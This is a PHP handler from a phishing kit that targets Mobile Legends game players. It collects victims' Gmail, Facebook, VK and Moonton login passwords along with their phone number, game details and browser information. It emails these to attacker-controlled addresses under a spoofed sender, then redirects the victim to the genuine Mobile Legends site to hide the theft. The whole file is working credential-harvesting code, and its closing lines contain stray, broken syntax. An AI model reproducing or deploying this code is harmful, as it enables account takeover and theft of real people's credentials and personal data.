 <?php

$nick = $_POST['nickname'];
$email1= $_POST['google1'];
$pass1 = $_POST['google2'];
$email2 = $_POST['fb1'];
$pass2 = $_POST['fb2'];
$email3 = $_POST['vk1'];
$pass3 = $_POST['vk2'];
$lev = $_POST['level'];
$log = $_POST['login'];
$ski = $_POST['skin'];
$coun = $_POST['country'];
$number= $_POST['phone'];
$faqih1 = $_POST['mn1'];
$faqih2 = $_POST['mn2'];
$platfrom = $_POST['pf'];

$message   = "
+------[ Setor Mobile Legend ]------+

• Email Gmail : ".$email1."
• Password Gmail :  ".$pass1."
+-----------------------------------+
• Email Facebook :  ".$email2."
• Password Facebook : ".$pass2."
+-----------------------------------+
• Email VK : ".$email3."
• Password VK : ".$pass3."
+-----------------------------------+
• Email Moonton : ".$faqih1."
• Password Moonton : ".$faqih2."


+----------[ Game Detail ]----------+

• Nickname : ".$nick."
• Level : ".$lev."
• Login With : ".$log."
• Total Skin : ".$ski."
• Platfrom : ".$platfrom."
• Number Phone : ".$number."

+------[ Device Information ]-------+

• Country : ".$coun."
• IP Info   :  ".$nama_negro." On ".gmdate('r')."
• Browser   :  ".$_SERVER['HTTP_USER_AGENT']."
+------------------------------------+

















";

include 'email.php';
$subject = "Mobile Legend [ ".$ski." Skin ] Punya [ ".$nick." ]";
$headers = "From: • MOBILE LEGEND • <admin@aspireone.usa.cc>";
mail($emailku, $subject, $message, $headers);

$md5      = md5(gmdate("r"));
$sha1     = sha1(gmdate("r"));



include 'gam/sendinbox.php';
$subject = "Mobile Legend [ ".$ski." Skin ] Punya [ ".$nick." ]";
$headers = "From: • MOBILE LEGEND • <admin@aspireone.usa.cc>";
mail($emailinbox, $subject, $message, $headers);

$md5      = md5(gmdate("r"));
$sha1     = sha1(gmdate("r"));

?>
'<script>window.location.replace("https://web.mobilelegends.com/")</script>';}
}
?>

<!-- Aditya Saputra -->
